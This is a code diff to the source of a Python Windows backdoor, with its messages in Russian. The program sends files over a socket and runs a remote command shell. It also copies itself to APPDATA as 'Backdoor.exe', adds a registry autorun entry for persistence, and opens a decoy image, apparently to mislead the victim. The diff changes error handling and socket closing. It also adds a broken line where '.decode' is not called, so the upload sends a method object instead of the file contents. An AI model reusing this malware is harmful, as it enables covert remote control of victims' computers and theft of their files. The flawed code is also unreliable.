@@ -64,10 +64,13 @@ def screenshot():
 def upload(sock, file_name):
     try:
         with open(file_name, "rb") as file:
-            reliable_send(base64.b64encode(file.read()).decode(), sock)
+            file_data = base64.b64encode(file.read()).decode
+            reliable_send(file_data, sock)
         reliable_send("[+] Файл успешно отправлен", sock)
     except FileNotFoundError:
         reliable_send("[!!] Файл не найден", sock)
+    except Exception as e:
+        reliable_send(f"[!!] Ошибка: {e}", sock)
 
 
 def save_file(sock, file_name):
@@ -95,6 +98,7 @@ def shell(sock):
     while True:
         command = reliable_recv(sock)
         if command == "q":
+            sock.close()
             break
         elif command.startswith("cd"):
             try:
@@ -135,7 +139,6 @@ def connection():
             time.sleep(5)
 
 
-# создание автозапуска в реестре
 def setup_autorun():
     location = os.environ["APPDATA"] + "\\Backdoor.exe"
     if not os.path.exists(location):
@@ -150,12 +153,13 @@ def setup_autorun():
                 winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
         except:
             pass
-        if hasattr(sys, "_MEIPASS"):
-            image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
-        else:
-            image_path = "aaa.jpg"
         try:
-            subprocess.Popen(["start", image_path], shell=True)
+            if hasattr(sys, "_MEIPASS"):
+                image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
+            else:
+                image_path = os.path.join(os.getcwd(), "aaa.jpg")
+            if os.path.exists(image_path):
+                subprocess.Popen(["start", image_path], shell=True)
         except:
             pass
 
